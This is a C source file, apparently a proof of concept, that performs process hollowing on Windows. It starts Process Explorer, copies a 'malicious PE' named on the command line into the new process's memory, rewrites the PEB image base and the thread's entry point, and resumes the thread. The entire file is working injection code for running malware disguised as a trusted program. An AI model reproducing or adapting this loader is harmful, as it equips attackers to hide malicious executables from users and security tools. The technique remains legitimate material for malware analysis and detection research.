#include <stdio.h>
#include <stddef.h>
#include <Windows.h>

typedef struct _UNICODE_STRING
{
     WORD Length;
     WORD MaximumLength;
     WORD * Buffer;
} UNICODE_STRING, *PUNICODE_STRING;
typedef struct _PEB
{
     UCHAR InheritedAddressSpace;
     UCHAR ReadImageFileExecOptions;
     UCHAR BeingDebugged;
     UCHAR BitField;
     PVOID Mutant;
     PVOID ImageBaseAddress;
     PVOID Ldr;
     PVOID ProcessParameters;
     PVOID SubSystemData;
     PVOID ProcessHeap;
     PRTL_CRITICAL_SECTION FastPebLock;
     PVOID AtlThunkSListPtr;
     PVOID IFEOKey;
     ULONG CrossProcessFlags;
     ULONG ProcessInJob: 1;
     ULONG ProcessInitializing: 1;
     ULONG ReservedBits0: 30;
     union
     {
          PVOID KernelCallbackTable;
          PVOID UserSharedInfoPtr;
     };
     ULONG SystemReserved[1];
     ULONG SpareUlong;
     PVOID FreeList;
     ULONG TlsExpansionCounter;
     PVOID TlsBitmap;
     ULONG TlsBitmapBits[2];
     PVOID ReadOnlySharedMemoryBase;
     PVOID HotpatchInformation;
     VOID * * ReadOnlyStaticServerData;
     PVOID AnsiCodePageData;
     PVOID OemCodePageData;
     PVOID UnicodeCaseTableData;
     ULONG NumberOfProcessors;
     ULONG NtGlobalFlag;
     LARGE_INTEGER CriticalSectionTimeout;
     ULONG HeapSegmentReserve;
     ULONG HeapSegmentCommit;
     ULONG HeapDeCommitTotalFreeThreshold;
     ULONG HeapDeCommitFreeBlockThreshold;
     ULONG NumberOfHeaps;
     ULONG MaximumNumberOfHeaps;
     VOID * * ProcessHeaps;
     PVOID GdiSharedHandleTable;
     PVOID ProcessStarterHelper;
     ULONG GdiDCAttributeList;
     PRTL_CRITICAL_SECTION LoaderLock;
     ULONG OSMajorVersion;
     ULONG OSMinorVersion;
     WORD OSBuildNumber;
     WORD OSCSDVersion;
     ULONG OSPlatformId;
     ULONG ImageSubsystem;
     ULONG ImageSubsystemMajorVersion;
     ULONG ImageSubsystemMinorVersion;
     ULONG ImageProcessAffinityMask;
     ULONG GdiHandleBuffer[34];
     PVOID PostProcessInitRoutine;
     PVOID TlsExpansionBitmap;
     ULONG TlsExpansionBitmapBits[32];
     ULONG SessionId;
     ULARGE_INTEGER AppCompatFlags;
     ULARGE_INTEGER AppCompatFlagsUser;
     PVOID pShimData;
     PVOID AppCompatInfo;
     UNICODE_STRING CSDVersion;
     PVOID ActivationContextData;
     PVOID ProcessAssemblyStorageMap;
     PVOID SystemDefaultActivationContextData;
     PVOID SystemAssemblyStorageMap;
     ULONG MinimumStackCommit;
     PVOID* FlsCallback;
     LIST_ENTRY FlsListHead;
     PVOID FlsBitmap;
     ULONG FlsBitmapBits[4];
     ULONG FlsHighIndex;
     PVOID WerRegistrationData;
     PVOID WerShipAssertPtr;
} PEB, *PPEB;
 
int readPE(char* path, char** pPe, long* lSize) {
    FILE* pFile;
    size_t result;
 
    // Read PE file
    printf("Target PE: %s\n", path);
    pFile = fopen(path, "rb");
    if (pFile == NULL) {fputs("fopen error", stderr); return 1;}
 
    fseek(pFile, 0, SEEK_END);
    *lSize = ftell(pFile);
    rewind(pFile);
 
    *pPe = (char*) malloc(sizeof(char)*(*lSize));
    if (*pPe == NULL) {fputs("malloc error", stderr); return 1;}
 
    result = fread(*pPe, 1, *lSize, pFile);
    if (result != *lSize) {fputs("fread error", stderr); return 1;}
    fclose(pFile);
 
    IMAGE_DOS_HEADER* dosHdr = (IMAGE_DOS_HEADER*)*pPe;
    IMAGE_NT_HEADERS* ntHdrs = (IMAGE_NT_HEADERS*)((size_t)dosHdr + dosHdr->e_lfanew);
    if (dosHdr->e_magic != IMAGE_DOS_SIGNATURE || ntHdrs->Signature != IMAGE_NT_SIGNATURE) {
        fputs("DOS or NT signature error", stderr);
        return 1;
    }
 
    return 0;
}
 
int writeMalPE(char* mal_pe_path, HANDLE hProcess, void** mal_image_base, size_t* aoe) {
    // read malicoius PE
    char* pe;
    long pe_size;
    IMAGE_NT_HEADERS* ntHdrs;
    IMAGE_FILE_HEADER* fileHdr;
    IMAGE_OPTIONAL_HEADER* optHdr;
    if (readPE(mal_pe_path, &pe, &pe_size)) {return 1;}
    ntHdrs = (IMAGE_NT_HEADERS*)((size_t)pe + ((IMAGE_DOS_HEADER*)pe)->e_lfanew);
    fileHdr = &(ntHdrs->FileHeader);
    optHdr = &(ntHdrs->OptionalHeader);
 
    // allocate memory in the target process
    void* image_base = VirtualAllocEx(hProcess, NULL, optHdr->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if(image_base == NULL) {
        fputs("VirtualAllocEx error", stderr); return 1;
    }
 
    // load malicious PE into the target process
    // -- header
    if (!WriteProcessMemory(hProcess, image_base, pe, optHdr->SizeOfHeaders, NULL)) {
        fputs("WriteProcessMemory (headers) error", stderr); return 1;
    }
    // -- section data
    IMAGE_SECTION_HEADER* sectHdrs = (IMAGE_SECTION_HEADER*)((size_t)optHdr + fileHdr->SizeOfOptionalHeader);
    for (size_t i = 0; i < fileHdr->NumberOfSections; i++) {
        if (!WriteProcessMemory(
                hProcess, 
                (LPVOID)((size_t)image_base + sectHdrs[i].VirtualAddress),
                (LPCVOID)((size_t)pe + sectHdrs[i].PointerToRawData), 
                sectHdrs[i].SizeOfRawData, 
                NULL)) {
            fputs("WriteProcessMemory (section) error", stderr); return 1;
        }
    }
 
    *mal_image_base = image_base;
    *aoe = ntHdrs->OptionalHeader.AddressOfEntryPoint;
    free(pe);
    return 0;
}
 
int main(int argc, char* argv[]) {
    // create benign process
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
 
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
 
    if(!CreateProcessA("C:\\Users\\poc\\Desktop\\SysinternalsSuite\\procexp.exe", 0, 0, 0, 
        false, 0, NULL, NULL, &si, &pi)) {
            fputs("CreateProcessA error", stderr); return 1;
    }
 
    // get context PEB.ImageBaseAddress
    CONTEXT* ctx;
    ctx = (CONTEXT*)VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
    ctx->ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, ctx)) {fputs("GetThreadContext error", stderr); return 1;}
    printf("ctx->eax: %x\n", ctx->Eax);
    printf("ctx->ebx: %x\n", ctx->Ebx);
 
    // write malicios PE to the process
    void* new_image_base;
    size_t aoe;
    writeMalPE(argv[1], pi.hProcess, &new_image_base, &aoe);
 
    // set context
    if (!WriteProcessMemory(pi.hProcess, (LPVOID)(ctx->Ebx + offsetof(PEB, ImageBaseAddress)), &new_image_base, sizeof(&new_image_base), NULL)) {
        fprintf(stderr, "WriteProcessMemory (ImageBaseAddress) error: %d", GetLastError()); return 1;
    }
    ctx->Eax = (size_t)new_image_base + aoe;
    SetThreadContext(pi.hThread, ctx);
 
    ResumeThread(pi.hThread);
    printf("Sometimes it don't work. Try it with argv[1]=tinyPE.exe.\n");
 
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}
